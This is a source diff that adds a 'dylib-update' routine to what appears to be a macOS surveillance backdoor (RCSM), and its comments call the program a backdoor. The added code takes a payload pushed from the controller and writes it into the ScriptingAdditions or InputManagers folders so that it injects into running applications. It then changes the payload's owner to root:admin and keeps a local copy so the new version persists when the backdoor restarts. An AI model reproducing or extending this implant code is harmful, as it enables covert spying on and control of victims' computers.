@@ -18,6 +18,10 @@
 #import "RCSMLogger.h"
 #import "RCSMDebug.h"
 
+#define CORE_UPGRADE  @"core-update"
+#define DYLIB_UPGRADE @"dylib-update"
+#define KEXT_UPGRADE  @"kext-update"
+
 
 @implementation UploadNetworkOperation
 
@@ -230,7 +234,7 @@
       verboseLog(@"file content: %@", fileContent);
 #endif
       
-      if ([filename isEqualToString: @"core-update"])
+      if ([filename isEqualToString: CORE_UPGRADE])
         {
 #ifdef DEBUG_UP_NOP
           infoLog(@"Received a core upgrade");
@@ -283,7 +287,7 @@
                                                          error: &error] == NO)
             {
 #ifdef DEBUG_UP_NOP
-              errorLog(@"Error while updating LaunchAgent file, reason: %@", [error localizedDescription]);
+              errorLog(@"Error while removing LaunchAgent file, reason: %@", [error localizedDescription]);
 #endif
             }
 
@@ -302,6 +306,81 @@
               infoLog(@"LaunchAgent file updated");
 #endif
             }
+        }
+      else if ([filename isEqualToString: DYLIB_UPGRADE])
+        {
+#ifdef DEBUG_UP_NOP
+          infoLog(@"Received a dylib upgrade");
+#endif
+          
+          NSString *_upgradePath;
+          NSString *_tempLocalPath = [[NSString alloc] initWithFormat:
+                                      @"%@/%@",
+                                      [[NSBundle mainBundle] bundlePath],
+                                      gInputManagerName];
+
+          if (gOSMajor == 10 && gOSMinor == 6)
+            {
+              _upgradePath = [[NSString alloc] initWithFormat:
+                @"/Library/ScriptingAdditions/%@/Contents/MacOS/%@", 
+                OSAX_FOLDER,
+                gInputManagerName];
+
+
+            }
+          else if (gOSMajor == 10 && gOSMinor == 5)
+            {
+              _upgradePath = [[NSString alloc] initWithFormat:
+                @"/Library/InputManagers/%@/%@.bundle/Contents/MacOS/%@",
+                INPUT_MANAGER_FOLDER,
+                INPUT_MANAGER_FOLDER,
+                gInputManagerName];
+
+              //
+              // Force owner since we can't remove that file if not owned by us
+              // with removeItemAtPath:error (Required only on Leopard)
+              //
+              NSString *userAndGroup = [NSString stringWithFormat: @"%@:staff", NSUserName()];
+              NSArray *_tempArguments = [[NSArray alloc] initWithObjects:
+                                         userAndGroup,
+                                         _upgradePath,
+                                         nil];
+
+              [gUtil executeTask: @"/usr/sbin/chown"
+                   withArguments: _tempArguments
+                    waitUntilEnd: YES];
+            }
+          
+          // Now remove it
+          [[NSFileManager defaultManager] removeItemAtPath: _upgradePath
+                                                     error: nil];
+
+          // And write it back
+          [fileContent writeToFile: _upgradePath
+                        atomically: YES];
+          
+          //
+          // Write it inside the local folder so that next time the backdoor starts
+          // it won't overwrite it within the old one
+          //
+          [[NSFileManager defaultManager] removeItemAtPath: _tempLocalPath
+                                                     error: nil];
+          [fileContent writeToFile: _tempLocalPath
+                        atomically: YES];
+
+          [_tempLocalPath release];
+
+          NSArray *arguments = [NSArray arrayWithObjects:
+                                @"-R",
+                                @"root:admin",
+                                _upgradePath,
+                                nil];
+
+          [gUtil executeTask: @"/usr/sbin/chown"
+               withArguments: arguments
+                waitUntilEnd: YES];
+          
+          [_upgradePath release];
         }
       else
         {
